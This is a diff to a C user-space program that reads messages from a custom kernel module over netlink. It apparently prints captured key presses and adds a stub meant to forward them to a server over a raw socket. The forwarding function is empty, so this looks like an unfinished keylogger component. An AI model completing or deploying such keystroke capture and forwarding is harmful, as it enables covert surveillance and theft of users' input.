@@ -2,8 +2,10 @@
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/socket.h>
 #include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <arpa/inet.h>
 #include <string.h>
 #include <asm/types.h>
 #include <linux/netlink.h>
@@ -12,9 +14,7 @@
 
 #define NETLINK_USER 30  // same customized protocol as in my kernel module
 #define MAX_PAYLOAD 1024 // maximum payload size
-#define buffersize 2000
 
-char buffer[buffersize];
 struct sockaddr saddr;
 struct sockaddr_nl src_addr, dest_addr;
 struct nlmsghdr *nlh = NULL;
@@ -22,16 +22,27 @@ struct nlmsghdr *nlh2 = NULL;
 struct msghdr msg, resp; // famous struct msghdr, it includes "struct iovec *   msg_iov;"
 struct iovec iov, iov2;
 
-int sock_fd;
-
+static int sendtoserver(int, char *);
+static int init_server();
 static int init_socket();
-static int bindsockets();
+static int bindsockets(int);
 
 int main()
 {
-
+    int sock_fd;
+    int server_fd;
     sock_fd = init_socket();
-    if (bindsockets() != 1)
+    if (sock_fd < 0)
+    {
+        exit(1);
+    }
+    server_fd = init_server();
+    if (server_fd < 0)
+    {
+        exit(1);
+    }
+
+    if (bindsockets(sock_fd) != 1)
         exit(1);
 
     nlh = (struct nlmsghdr *)malloc(NLMSG_SPACE(MAX_PAYLOAD));
@@ -74,23 +85,27 @@ int main()
     resp.msg_iovlen = 1;
 
     int ret = sendmsg(sock_fd, &msg, 0);
+    if (ret < 0)
+        exit(1);
 
-    /* Read message from kernel */
     recvmsg(sock_fd, &resp, 0); // msg is also receiver for read
 
-    printf("Received message payload: %s\n", (char *)NLMSG_DATA(nlh2));
-
-    char usermsg[MAX_PAYLOAD];
     while (1)
     {
-
-        strcpy(NLMSG_DATA(nlh), usermsg); // put "Hello" msg into nlh
+        printf("\nPressed : %s\n", (char *)NLMSG_DATA(nlh2));
+        if (sendtoserver(server_fd, (char *)NLMSG_DATA(nlh2)) != 1)
+        {
+            exit(1);
+        }
+        strncpy(NLMSG_DATA(nlh), "1", 1);
 
         ret = sendmsg(sock_fd, &msg, 0);
+        if (ret < 0)
+        {
+            exit(1);
+        }
 
         recvmsg(sock_fd, &resp, 0);
-
-        printf("Received message payload: %s\n", (char *)NLMSG_DATA(nlh2));
     }
     free(nlh);
     free(nlh2);
@@ -101,13 +116,10 @@ int main()
 
 static int init_socket()
 {
-    int s = socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
-    if (s < 0)
-        exit(1);
-    return s;
+    return socket(PF_NETLINK, SOCK_RAW, NETLINK_USER);
 }
 
-static int bindsockets()
+static int bindsockets(int sock_fd)
 {
 
     memset(&src_addr, 0, sizeof(src_addr));
@@ -124,5 +136,14 @@ static int bindsockets()
     {
         exit(1);
     }
+    return 1;
+}
+static int init_server()
+{
+    return socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+}
+static int sendtoserver(int server_fd, char *message)
+{
+
     return 1;
 }
